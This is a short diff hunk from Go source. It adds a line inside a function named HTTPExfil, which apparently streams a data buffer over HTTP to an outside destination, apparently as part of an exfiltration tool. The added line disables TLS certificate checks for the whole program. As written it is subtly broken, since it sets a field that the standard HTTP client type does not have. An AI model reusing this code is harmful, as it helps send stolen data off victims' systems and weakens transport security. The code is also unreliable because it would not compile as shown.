@@ -267,6 +267,8 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 		var stream = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
+		http.DefaultClient.TLSClientConfig.InsecureSkipVerify = true
+
 		for {
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
 				return nil
